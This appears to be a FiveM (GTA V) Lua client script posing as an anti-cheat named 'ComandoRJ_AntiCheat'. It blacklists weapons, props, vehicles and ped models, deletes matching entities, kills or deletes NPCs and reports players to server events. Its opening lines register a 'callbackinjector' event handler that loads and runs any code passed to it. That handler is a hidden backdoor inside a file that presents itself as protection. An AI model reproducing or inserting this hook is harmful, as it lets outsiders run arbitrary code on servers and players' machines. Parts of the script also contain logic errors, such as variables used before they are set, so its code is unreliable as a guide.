local Tunnel = module("vrp","lib/Tunnel")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)

WeaponBL={
"WEAPON_BALL",  
"WEAPON_LAIZER",
"WEAPON_GARBAGEBAG",
"WEAPON_RPG",
"WEAPON_MINIGUN",
"WEAPON_PROXMINE",
"WEAPON_BALL",
"WEAPON_RAILGUN",
"WEAPON_SPERRIFLE",
"WEAPON_HEAVYSNIPER",
"WEAPON_WEAPON_HEAVYSNIPER_MK2",
"WEAPON_MARKSMANRIFLE",
"WEAPON_MARKSMANRIFLE_MK2",
"WEAPON_GRENADELAUNCHER",
"WEAPON_GRENADELAUNCHER_SMOKE",
"WEAPON_HOMINGLAUNCHER",
"WEAPON_COMPACTLAUNCHER",
"WEAPON_RAYMINIGUN",
"WEAPON_AUTOSHOTGUN",
"WEAPON_MARKSMANPISTOL",
"WEAPON_REVOLVER",
"WEAPON_REVOLVER_MK2",
"WEAPON_DOUBLEACTION",
"WEAPON_RAYLPISTOL",
"WEAPON_CERAMICPISTOL",
"WEAPON_NAVYREVOLVER",
"WEAPON_VINTAGEPISTOL",
"WEAPON_HEAVYPISTOL",
"WEAPON_SNSPISTOL_MK2",
"WEAPON_SNSPISTOL",
"WEAPON_PISTOL50",
"WEAPON_COMPACTRIFLE",
"WEAPON_SPECIALCARBINE_MK2",
"WEAPON_ASSAULTSHOTGUN",
}

ObjectsBL={
"hei_prop_heist_weed_pallet",
"prop_weed_pallet",
"p_cs_mp_jet_01_s",
"hei_prop_heist_tug",
"stt_prop_stunt_jump45",
"stt_prop_stunt_jump30",
"prop_const_fence02b",
"prop_const_fence03b_cr",
"prop_const_fence01b_cr",
"v_ilev_mr_rasberryclean",
"p_spinning_anus_s",
"p_oil_pjack_01_s",
"p_oil_pjack_02_s",
"p_oil_pjack_03_s",
"hei_prop_carrier_radar_1",
"prop_ld_ferris_wheel",
"v_ilev_found_cranebucket",
"prop_money_bag_01",
"prop_swiss_ball_01",
"prop_juicestand",
"root_scroll_anim_skel",
"p_fib_rubble_s",
"p_cs_sub_hook_01_s",
"hei_prop_hei_bust_01",
"v_ilev_mm_screen2_vl",
"v_ilev_carmod3lamp",
"v_ilev_carmodlamps",
"v_ilev_fh_lampa_on",
"p_hw1_22_doors_s",
"prop_wheelchair_01_s",
"p_cs_mp_jet_01_s",
"prop_mp_arrow_ring",
"prop_mp_pointer_ring",
"hei_prop_heist_emp",
"hei_prop_wall_alarm_on",
"prop_asteroid_01",
"prop_alien_egg_01",
"prop_water_corpse_01",
"prop_water_corpse_02",
"prop_xmas_ext",
"prop_windmill_01",
"prop_ztype_covered",
"prop_wrecked_buzzard",
"prop_v_5_bclock",
"prop_aircon_l_03",
"prop_arcade_01",
"prop_pooltable_02",
"prop_jukebox_02",
"prop_fnclink_02a",
"prop_weed_pallet",
"prop_beach_fire",  -- ese
} 

CarsBL = {
"vigilante",
"hydra",
"buzzard",
"deluxo",
"avenger",
"akula",
"apc",
"barrage",
"caracara",
"cargobob",
"chernobog",
"hunter",
"insurgent",
"starling",
"lazer",
"bombushka",
"savage",
"rhino",
"khanjali",
"cargoplane",
"strikeforce",
"pyro",
"valkyrie",
"scramjet",
"technical",
"adder",
} 

pedblacklist = {
	"CSB_BallasOG",
}

defaultpedmodel = {
 "a_m_y_skater_01",
}



Citizen.CreateThread(function()
	while true do
		Wait(100)
		if IsPedInAnyVehicle(GetPlayerPed(-1)) then
		v = GetVehiclePedIsIn(playerPed, false)
		end
		playerPed = GetPlayerPed(-1)
		if whitelisted == nil and playerPed and v then
		if GetPedInVehicleSeat(v, -1) == playerPed then
			checkCar(GetVehiclePedIsIn(playerPed, false))
			end
		end
	end
end)

function checkCar(car)
	if car then
		carModel = GetEntityModel(car)
		carName = GetDisplayNameFromVehicleModel(carModel)
		if isCarBlacklisted(carModel) then
			_DeleteEntity(car)
			TriggerServerEvent("ComandoRJ_AntiCheat:Cars", blacklistedCar )
		end
	end
end

function isCarBlacklisted(model)
	for _, blacklistedCar in pairs(CarsBL) do
		if model == GetHashKey(blacklistedCar) then
			return true
		end
	end

	return false
end

function _DeleteEntity(entity)
	Citizen.InvokeNative(0xAE3CBE5BF394C9C9, Citizen.PointerValueIntInitialized(entity))
end

------------------------------------------------------------------------------

Citizen.CreateThread(function()
	while true do
		Wait(15)

		playerPed = GetPlayerPed(-1)
		if playerPed then
			playerModel = GetEntityModel(playerPed)

			if not prevPlayerModel then
				if isPedBlacklisted(prevPlayerModel) then
					SetPlayerModel(PlayerId(), GetHashKey(defaultpedmodel))
					TriggerServerEvent("ComandoRJ_AntiCheat:playerPed", defaultpedmodel )
				else
					prevPlayerModel = playerModel
				end
			else
				if isPedBlacklisted(playerModel) then
					SetPlayerModel(PlayerId(), prevPlayerModel)
				end

				prevPlayerModel = playerModel
			end
		end
	end
end)

function isPedBlacklisted(model)
	for _, blacklistedPed in pairs(pedblacklist) do
		if model == GetHashKey(blacklistedPed) then
			return true
		end
	end

	return false
end

Citizen.CreateThread(function() while true do Citizen.Wait(30000) collectgarbage() end end)
------------------------------------------------------
Citizen.CreateThread(function()
	while true do
	Citizen.Wait(100)
	for _,theWeapon in ipairs(WeaponBL) do
		Wait(15)
		if HasPedGotWeapon(PlayerPedId(),GetHashKey(theWeapon),false) == 1 then
		TriggerServerEvent("ComandoRJ_AntiCheat:Weapon", theWeapon )
		RemoveAllPedWeapons(PlayerPedId(),false)
		end
	end
	end
end)

function DeleteObjects(object, detach)
	if DoesEntityExist(object) then
	NetworkRequestControlOfEntity(object)
	while not NetworkHasControlOfEntity(object) do
		Citizen.Wait(15)
	end
	if detach then
		DetachEntity(object, 0, false)
	end	
	SetEntityCollision(object, false, false)
	SetEntityAlpha(object, 0.0, true)
	SetEntityAsMissionEntity(object, true, true)
	SetEntityAsNoLongerNeeded(object)
	DeleteEntity(object)
	end
end

Citizen.CreateThread(function()
	while true do
	Citizen.Wait(100)
	local ped = PlayerPedId()
	local handle, object = FindFirstObject()
	local finished = false
	repeat
		Wait(15)
		if IsEntityAttached(object) and DoesEntityExist(object) then
		if GetEntityModel(object) == GetHashKey("prop_acc_guitar_01") or GetEntityModel(object) == GetHashKey("prop_weed_pallet") then
            DeleteObjects(object, true)
		end
		end
		for i=1,#ObjectsBL do
		if GetEntityModel(object) == GetHashKey(ObjectsBL[i]) then
			DeleteObjects(object, false)
			TriggerServerEvent("ComandoRJ_AntiCheat:object", ObjectsBL )
		end
		end
		finished, object = FindNextObject(handle)
	until not finished
	EndFindObject(handle)
	end
end)
----------------------------------------------------------------------------------------------------------------------
function KillAllPeds()
	local pedweapon
	local pedid
	for ped in CRJEnumeracao() do 
			if DoesEntityExist(ped) then
					pedid = GetEntityModel(ped)
					pedweapon = GetSelectedPedWeapon(ped)
					if pedweapon == -1312131151 or not IsPedHuman(ped) then 
							ApplyDamageToPed(ped, 1000, false)
							DeleteEntity(ped)
					else
							switch = function (choice)
									choice = choice and tonumber(choice) or choice
								
									case =
									{
											[451459928] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,
								
											[1684083350] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,

											[451459928] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,
						
											[1096929346] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,

											[880829941] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,
				
											[-1404353274] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,

											[2109968527] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,
											
										 default = function ( )
										 end,
									}
									if case[choice] then
										 case[choice]()
									else
										 case["default"]()
									end
								end
								switch(pedid) 
					end
			 end
	end
end

Citizen.CreateThread(function()
	while (true) do
			Citizen.Wait(100)
			KillAllPeds()
			DeleteEntity(ped)
	end
end) 

local entityEnumerator = { __gc = function(enum) if enum.destructor and enum.handle then enum.destructor(enum.handle) end enum.destructor = nil enum.handle = nil end }

local function EnumerateEntities(initFunc, moveFunc, disposeFunc) return coroutine.wrap(function() local iter, id = initFunc() if not id or id == 0 then disposeFunc(iter) return end local enum = {handle = iter, destructor = disposeFunc} setmetatable(enum, entityEnumerator) local next = true repeat coroutine.yield(id) next, id = moveFunc(iter) until not next enum.destructor, enum.handle = nil, nil disposeFunc(iter) end) end

function CRJEnumeracao() return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed) end

Citizen.CreateThread(function()
	while true do
	Citizen.Wait(3000)
		thePeds = CRJEnumeracao()
		PedStatus = 0
		for ped in thePeds do
			PedStatus = PedStatus + 1
			if not (IsPedAPlayer(ped))then
					DeleteEntity(ped)
					RemoveAllPedWeapons(ped, true)
			end
	end		
  end
end)
--------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
        Citizen.Wait(8)
        if (AntiCheat == true)then
		if IsPedJumping(PlayerPedId()) then
			local jumplength = 0
			repeat
				Wait(15)
				jumplength=jumplength+1
				local isStillJumping = IsPedJumping(PlayerPedId())
			until not isStillJumping
			if jumplength > 250 then
                TriggerServerEvent("ComandoRJ_AntiCheat:Jump", jumplength )
			end
        end
    end
	end
end)

Citizen.CreateThread(function() while true do Citizen.Wait(30000) collectgarbage() end end) -- Corrigir vazamentos de RAM coletando lixo